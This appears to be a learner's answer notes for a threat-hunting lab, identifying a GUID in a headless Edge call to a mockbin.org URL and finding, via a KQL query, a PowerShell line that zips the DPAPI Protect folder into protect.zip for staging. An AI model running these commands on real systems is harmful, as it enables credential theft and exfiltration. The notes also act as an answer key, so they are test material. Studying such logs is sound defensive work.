2.12

What GUID is being used in conjunction with this?
 this means with this command start "" msedge --headless=new --disable-gpu https://mockbin.org/bin/aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3

GUID stands for Globally Unique Identifier.
Example:
ProcessGuid: {A23B4C5D-1234-5678-9ABC-DEF012345678}

so in we take the command from question 2.11 

start "" msedge --headless=new --disable-gpu https://mockbin.org/bin/aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3


// response of the question is aaccd6de-ce95-4fb2-b2c1-2d7ca08661a3

2.13
Investigate likely data exfiltration.

What filename were they using to stage the data?

let A=
ProcessEvents
| where process_commandline contains "reg.exe save"
| distinct username;
ProcessEvents
| where username in (A)
| extend files = extract_all(@"([A-Za-z0-9_\-]+\.(zip|7z|rar|cab|tmp|dat|bin))", process_commandline)
| where array_length(files) > 0
| project timestamp, process_commandline, files

powershell Compress-Archive %USERPROFILE%\AppData\Roaming\Microsoft\Protect %USERPROFILE%\AppData\Roaming\Microsoft\protect.zip
"protect.zip",  "zip"

//response is: protect.zip  using to stage the data

